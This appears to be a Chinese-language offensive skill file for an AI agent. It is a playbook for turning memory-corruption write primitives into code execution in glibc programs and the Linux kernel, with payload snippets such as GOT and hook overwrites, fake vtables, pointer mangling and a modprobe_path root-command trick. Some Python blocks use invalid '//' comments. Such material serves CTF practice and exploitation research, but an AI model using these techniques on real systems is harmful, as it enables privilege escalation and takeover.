# 技能：任意写至代码执行 — 专家攻击手册

> **AI 加载指令**：将任意写原语转换为代码执行的高级技巧。涵盖按 glibc 版本兼容性组织的所有主要覆盖目标：GOT、__malloc_hook、__free_hook、_IO_FILE vtable、__exit_funcs、TLS_dtor_list、_dl_fini、modprobe_path、.fini_array、C++ vtable 和 setcontext gadget。这是“最后一公里”技能。基础模型通常针对已不再存在的钩子（glibc 2.34 之后）或遗漏了指针混淆要求。

## 0. 相关路由

- [堆攻击](../heap-exploitation/SKILL.md) — 通过堆攻击获取任意写
- [格式化字符串攻击](../format-string-exploitation/SKILL.md) — 通过 %n 获取任意写
- [栈溢出与 ROP](../stack-overflow-and-rop/SKILL.md) — 基于栈的写原语
- [二进制保护绕过](../binary-protection-bypass/SKILL.md) — 给定保护配置下可用的目标
- [堆攻击 IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) — 深入 _IO_FILE 结构利用

---

## 1. 按 glibc 版本选择目标

| 目标 | glibc < 2.24 | 2.24–2.33 | ≥ 2.34 | 所需知识 |
|---|---|---|---|---|
| GOT 覆盖 | OK (部分 RELRO) | OK (部分 RELRO) | OK (部分 RELRO) | 二进制基础 |
| `__malloc_hook` | OK | OK | **移除** | libc 基础 |
| `__free_hook` | OK | OK | **移除** | libc 基础 |
| `__realloc_hook` | OK | OK | **移除** | libc 基础 |
| `_IO_FILE` vtable (直接) | OK | vtable 范围检查 | vtable 范围检查 | libc 基础 + 堆 |
| `_IO_FILE` 通过 `_IO_str_jumps` | N/A | OK (2.24–2.27) | 已修复 | libc 基础 + 堆 |
| `_IO_FILE` 通过 `_IO_wfile_jumps` | N/A | OK (≥ 2.28) | OK | libc 基础 + 堆 |
| `__exit_funcs` | OK | OK | OK | libc 基础 + 指针保护 |
| `TLS_dtor_list` | N/A | N/A | OK | TLS 地址 + 指针保护 |
| `_dl_fini` / link_map | OK | OK | OK | ld.so 基础 |
| `modprobe_path` (内核) | OK | OK | OK | 内核基础 |
| `.fini_array` | OK | OK | OK | 二进制基础 (如果可写) |
| C++ vtable | OK | OK | OK | 对象地址 + 堆 |
| `setcontext` gadget | OK | OK (2.29 中已更改) | OK | libc 基础 |
| 栈返回地址 | 总是 | 总是 | 总是 | 栈地址 |

---

## 2. GOT 覆盖

**替换全局偏移表中的函数指针。**

### 要求
- 部分RELRO (`.got.plt` 可写) — 完全 RELRO 会完全阻止此操作

### 常见目标

| 覆盖来源 | 覆盖目标 | 触发方式 |
|---|---|---|
| `printf@GOT` | `system` | 下一个 `printf(user_input)`，输入为 `/bin/sh` |
| `free@GOT` | `system` | 下一个 `free(ptr)`，其中 ptr 指向 `"/bin/sh"` |
| `strlen@GOT` | `system` | 下一个 `strlen(user_input)` |
| `atoi@GOT` | `system` | 下一个 `atoi(user_input)`，输入为 `"sh"` |
| `puts@GOT` | `system` | 下一个 `puts(user_input)` |
| `exit@GOT` | `main` 或 gadget | 创建多射击漏洞的循环 |
| `__stack_chk_fail@GOT` | `ret` gadget | 中和 canary 检查 |

```python
# 格式化字符串 GOT 覆盖
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})

# 基于堆的 GOT 覆盖 (tcache 毒化)
# 在 GOT 地址分配块 → 写入 system 地址
```

---

## 3. `__malloc_hook` / `__free_hook` (glibc < 2.34)

### `__malloc_hook`

```python
# 用 one_gadget 地址覆盖 __malloc_hook
# 任何 malloc 调用都会触发 (包括 printf 中的内部 malloc 大格式)
write(libc.sym['__malloc_hook'], one_gadget_addr)
# 触发:
io.sendline('%100000c')  # printf 内部调用 malloc 用于大格式
```

### `__free_hook`

```python
# 用 system 覆盖 __free_hook
write(libc.sym['__free_hook'], libc.sym['system'])
# 触发: 释放包含 `/bin/sh` 的块
chunk_data = b'/bin/sh\x00'
# ... 用此数据分配块，然后释放它
```

### 重新分配技巧用于 one_gadget 限制

```python
# one_gadget 通常需要特定的寄存器/栈状态
# realloc 在调用 __realloc_hook 之前推送寄存器并调整栈
# 设置 __malloc_hook = realloc+N (跳过一些推送以调整栈对齐)
# 设置 __realloc_hook = one_gadget
write(libc.sym['__realloc_hook'], one_gadget)
write(libc.sym['__malloc_hook'], libc.sym['realloc'] + 2)  # +2, +4, +6 等，以调整
```

---

## 4. `_IO_FILE` VTABLE

有关完整详细信息，请参阅 [IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md)。

### 按版本快速总结

| glibc | 方法 | Vtable 目标 |
|---|---|---|
| < 2.24 | 直接 vtable 覆盖 | 将 vtable 指向包含 `system` 在 `__overflow` 偏移的假表 |
| 2.24–2.27 | `_IO_str_jumps` | 在有效范围内；`_IO_str_finish` 调用 `_s._free_buffer` |
| ≥ 2.28 | `_IO_wfile_jumps` | 宽字符路径：`_wide_data->_wide_vtable` 未进行范围检查 |
| ≥ 2.35 | House of Cat | `_IO_wfile_seekoff` → `_IO_switch_to_wget_mode` → 假宽 vtable 调用 |

### FSOP 触发

```python
# 覆盖 _IO_list_all → 假 FILE，具有定制的 vtable
# 通过 exit() 或 malloc 失败触发 → _IO_flush_all_lockp → _IO_OVERFLOW
```

---

## 5. `__exit_funcs` / `__atexit`

```c
// __exit_funcs 是在退出时调用的函数指针条目的链表
// 每个条目包含一个风味 (cxa, on, at) 和一个函数指针
// 函数指针使用指针保护进行混淆：
//   存储 = ROL(ptr ^ __pointer_chk_guard, 0x11)
```

### 利用

```python
// 需要: libc 基础 + __pointer_chk_guard 值 (fs:[0x30] 或泄露)
// 1. 泄露或暴力破解指针保护
// 2. 计算混淆的函数指针:
import struct
def mangle(ptr, guard):
    return ((ptr ^ guard) << 0x11 | (ptr ^ guard) >> (64-0x11)) & 0xffffffffffffffff

// 3. 将混淆的 one_gadget/system 写入 __exit_funcs 条目
// 4. 触发: 调用 exit() 或从 main 返回
```

### 无指针保护知识

如果你可以覆盖函数指针和指针保护（在 TLS 中位于 `fs:[0x30]`）：
1. 将指针保护设置为 0
2. 将函数指针设置为 `ROL(target, 0x11)`
3. 解混淆: `ROR(stored, 0x11) ^ 0 = ROR(ROL(target, 0x11), 0x11) = target`

---

## 6. TLS_dtor_list (glibc ≥ 2.34)

**线程局部析构函数列表 — 2.34 之后的主要目标。**

```c
// 在退出流程中的 __call_tls_dtors() 中调用
// 每个条目: { void (*func)(void *), void *obj, void *next }
// func 与 exit_funcs 相同地混淆 (PTR_DEMANGLE)
```

### 位置

```
TLS 区域 (在 x86-64 上由 fs 寄存器指向)
tls_dtor_list 是 libc 中的线程局部变量
通常位于 fs:[offset] — 通过 libc 符号或暴力破解找到的偏移
```

### 利用

```python
// 1. 泄露 TLS 基地址 (例如，通过 canary 泄露: canary 位于 fs:[0x28])
// 2. 计算 tls_dtor_list 地址
// 3. 伪造一个 tls_dtor_list 条目:
entry = p64(mangled_func_ptr)  # func (使用指针保护混淆)
entry += p64(arg_value)         # obj (作为 func 的参数传递)
entry += p64(0)                 # next = NULL (列表末尾)
// 4. 将条目写入堆，设置 tls_dtor_list 指向它
// 5. 触发: exit() → __call_tls_dtors() → func(obj)
```

---

## 7. `_dl_fini` / LINK_MAP CORRUPTION

### 攻击向量

在 `exit()` 时，`_dl_fini` 迭代 link_map 列表并调用 `DT_FINI_ARRAY` 条目。

```c
// 在 _dl_fini 中:
for 每个加载的库 (link_map 条目):
    if l_info[DT_FINI_ARRAY]:
        array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr
        for array 中的每个条目:
            entry()  // 调用析构函数
```

### 利用

1. 损坏 `link_map` 条目的 `l_addr` (重定位基址) 以使 FINI_ARRAY 指针偏移
2. 或损坏 `l_info[DT_FINI_ARRAY]` 以指向假数组
3. 假数组包含目标函数指针 (system, one_gadget)
4. 触发: `exit()` → `_dl_fini` → 调用假析构函数

**优势**：无需指针混淆 (FINI_ARRAY 中的函数指针未混淆)。

---

## 8. modprobe_path (内核)

**覆盖内核的 `modprobe_path` 以以 root 身份执行任意命令。**

```python
# 1. 任意内核写：覆盖 modprobe_path ("/sbin/modprobe")
#    为 "/tmp/x" (攻击者的脚本)
kernel_write(modprobe_path_addr, b'/tmp/x\x00')

# 2. 准备脚本:
# echo '#!/bin/sh' > /tmp/x
# echo 'cat /flag > /tmp/output' >> /tmp/x
# chmod +x /tmp/x

# 3. 触发: 执行未知二进制格式的文件
# echo -ne '\xff\xff\xff\xff' > /tmp/trigger
# chmod +x /tmp/trigger
# /tmp/trigger
# → 内核以 root 身份调用 modprobe_path ("/tmp/x")
```

有关内核写原语的详细信息，请参阅 [kernel-exploitation](../kernel-exploitation/SKILL.md)。

---

## 9. .fini_array

**覆盖在正常程序退出时调用的析构函数指针。**

```python
# .fini_array 包含在退出时按逆序调用的函数指针
# 通常: [__do_global_dtors_aux, ...]
# 覆盖第一个条目为 target (main 用于循环，system 用于 RCE)

# 两阶段: .fini_array[0] = main (循环回), .fini_array[1] = <exploit_func>
# 第一次退出: 调用 .fini_array[1] (exploit_func)，然后 .fini_array[0] (main)
# 在 main 循环中: 设置最终利用
```

**限制**：在完全 RELRO 二进制中，`.fini_array` 可能是只读的。

---

## 10. C++ VTABLE 覆盖

```cpp
// 具有虚拟函数的 C++ 对象在偏移 0 处有一个 vptr
// vptr → vtable → 函数指针数组
// 覆盖 vptr 以指向具有受控函数指针的假 vtable

// 对象布局:
// +0x00: vptr → [vtable_entry_0, vtable_entry_1, ...]
// +0x08: 成员数据...
```

```python
# 1. 泄露对象地址和 vptr
# 2. 在受控内存中创建假 vtable:
fake_vtable = p64(0)              # 偏移 -0x10 (RTTI 信息)
fake_vtable += p64(0)             # 偏移 -0x08 (RTTI 信息)
fake_vtable += p64(target_func)   # 虚拟函数 0 → system / one_gadget
fake_vtable += p64(target_func)   # 虚拟函数 1
# 3. 覆盖 vptr 以指向 fake_vtable + 0x10 (跳过 RTTI 前缀)
# 4. 触发: 在对象上调用虚拟函数
```

---

## 11. setcontext GADGET

libc 中的 `setcontext` 从 `ucontext_t` 结构中加载寄存器，可作为转换 gadget 使用。

### glibc < 2.29

```c
// setcontext+53: 从 [rdi + 偏移] 加载寄存器
// RDI = 第一个参数 = 指向受控缓冲区的指针
// 设置 RSP、RIP 和所有其他寄存器 → 完全控制
```

### glibc ≥ 2.29

```c
// setcontext+61: 从 [rdx + 偏移] 加载寄存器
// 必须控制 RDX，而不是 RDI
// 需要一个中间 gadget: mov rdx, [rdi+X]; ... ; call/jmp [rdx+Y]
```

```python
# 常见模式与 __free_hook (2.34 之前):
# __free_hook = setcontext + 61
# free(chunk) → setcontext(chunk) 其中 chunk 包含假 ucontext
# 从 ucontext: 设置 RSP 为 ROP 链，RIP 为 ret → ROP 继续

# 2.34 之后: 与 _IO_FILE 利用结合
# _IO_FILE vtable 调用将 fp 作为第一个参数 → 使用 gadget 将其移动到 rdx → setcontext
```

---

## 12. 决策树

```
你有一个任意写原语。要攻击什么？

├── RELRO 级别是什么？
│   ├── 无 / 部分RELRO → GOT 覆盖 (最简单、最可靠)
│   │   └── printf→system, free→system, atoi→system
│   └── 完全 RELRO → GOT 只读，选择替代方案:
│
├── glibc 版本是什么？
│   ├── < 2.34 (钩子可用)
│   │   ├── __free_hook = system → free("/bin/sh") [最简单]
│   │   ├── __malloc_hook = one_gadget → 触发 malloc [如果限制满足]
│   │   └── __realloc_hook + __malloc_hook 重新分配技巧 [调整栈对齐]
│   │
│   ├── ≥ 2.34 (无钩子)
│   │   ├── 知道指针保护 (fs:[0x30])？
│   │   │   ├── 是 → __exit_funcs 或 TLS_dtor_list
│   │   │   └── 否 → 首先覆盖指针保护为 0，然后 exit_funcs
│   │   ├── _IO_FILE + _IO_wfile_jumps (House of Apple 2 / Cat)
│   │   │   └── 需要: libc 基础 + 堆地址 + 可控的 FILE 结构
│   │   ├── _dl_fini link_map 损坏
│   │   │   └── 需要: ld.so 基础地址
│   │   └── .fini_array (如果可写)
│   │       └── 需要: 二进制基础 (无 PIE，或 PIE 基础泄露)
│   │
│   └── 任何版本
│       ├── 栈返回地址 (如果栈地址已知)
│       └── C++ vtable (如果针对具有虚拟函数的 C++ 对象)
│
├── 内核写原语？
│   ├── modprobe_path (最简单的内核→root)
│   ├── core_pattern (/proc/sys/kernel/core_pattern)
│   └── 直接 cred 结构覆盖
│
└── 需要链式读取→写→执行？
    └── setcontext gadget: 任意写 → 转换 RSP → ROP 链
        ├── glibc < 2.29: setcontext+53 (使用 RDI)
        └── glibc ≥ 2.29: setcontext+61 (使用 RDX，需要 mov rdx, [rdi] gadget)
```
